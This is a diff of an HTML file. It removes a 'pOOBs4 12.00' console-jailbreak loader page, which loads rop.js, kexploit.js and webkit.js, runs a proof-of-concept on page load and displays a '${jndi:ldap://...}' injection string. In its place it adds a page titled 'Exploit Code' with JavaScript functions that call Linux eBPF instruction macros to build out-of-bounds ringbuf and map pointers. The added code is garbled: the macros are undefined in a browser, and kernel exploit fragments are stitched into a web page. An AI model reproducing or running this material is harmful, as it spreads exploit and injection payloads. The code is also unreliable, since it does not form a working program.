@@ -1,90 +1,50 @@
-<html>
-
+```html
+<!DOCTYPE html>
+<html lang="en">
 <head>
-    <title>pOOBs4 12.00</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        body {
-            background-color: #242629;
-        }
-
-        .loader {
-            position: absolute;
-            left: 50%;
-            top: 50%;
-            margin: -75px 0 0 -75px;
-
-            border: 10px solid #1f1e1e;
-            border-radius: 50%;
-            border-top: 10px solid #044595;
-            border-left: 10px solid #044595;
-            width: 120px;
-            height: 120px;
-            animation: spin 1s linear infinite;
-        }
-
-        @keyframes spin {
-            0% {
-                transform: rotate(0deg);
-            }
-
-            100% {
-                transform: rotate(360deg);
-            }
-        }
-
-        .info {
-            overflow: hidden;
-            position: fixed;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-
-            font-size: 45px;
-            font-family: sans-serif;
-            color: #b8b8b8;
-
-            transform: translate(-50%, -50%);
-        }
-
-        .j {
-            font-size: 15px;
-            color: #2F3335;
-        }
-    </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exploit Code</title>
+</head>
+<body>
     <script>
-        function allset() {
-            document.getElementById("loader").style.display = "none";
-            document.getElementById("allset").style.display = "block";
+        const exploitContext = {
+            ringbuf_map_fd: 0,
+            a_fd: 0,
+            b_fd: 0,
+            prog_fd: 0,
+            kernel_slide: 0
+        };
+
+        function getInvalidPointer(oob_map_fd, dest_reg, value) {
+            BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd);
+            BPF_MOV64_IMM(BPF_REG_2, 0);
+            BPF_MOV64_IMM(BPF_REG_3, 0xffffffffffffffff);
+            BPF_EMIT_CALL(BPF_RINGBUF_RESERVE);
+            BPF_MOV64_REG(dest_reg, BPF_REG_0);
+            BPF_ALU64_IMM(BPF_ADD, dest_reg, value - 1);
+            BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 5);
+            BPF_MOV64_REG(BPF_REG_1, BPF_REG_0);
+            BPF_MOV64_IMM(BPF_REG_2, 0);
+            BPF_EMIT_CALL(BPF_RINGBUF_DISCARD);
+            BPF_MOV64_IMM(BPF_REG_0, 0);
+            BPF_EXIT_INSN();
+            BPF_ALU64_IMM(BPF_ADD, dest_reg, 1);
         }
 
-        function awaitpl() {
-            document.getElementById("loader").style.display = "none";
-            document.getElementById("awaiting").style.display = "block";
+        function getMapValuePointer(map_fd, key, dest_reg) {
+            BPF_LD_MAP_FD(BPF_REG_1, map_fd);
+            BPF_MOV64_IMM(BPF_REG_0, key);
+            BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4);
+            BPF_MOV64_REG(BPF_REG_2, BPF_REG_10);
+            BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4);
+            BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem);
+            BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2);
+            BPF_MOV64_IMM(BPF_REG_0, 0);
+            BPF_EXIT_INSN();
+            BPF_MOV64_REG(dest_reg, BPF_REG_0);
         }
     </script>
-    <script src="int64.js"></script>
-    <script src="rop.js"></script>
-    <script src="kexploit.js"></script>
-    <script src="webkit.js"></script>
-</head>
-
-</html>
-
-<body onload="setTimeout(poc, 1500);">
-
-    <div id="loader" class="loader"></div>
-    <div id="awaiting" class="info" style="display:none;">
-        Awaiting Payload...
-        <br />
-        <span class="j">${jndi:ldap://nsa.gov}</span>
-    </div>
-
-    <div id="allset" class="info" style="display:none;">
-        You're all set!
-    </div>
-
 </body>
-<script>
-
-</script>
+</html>
+```
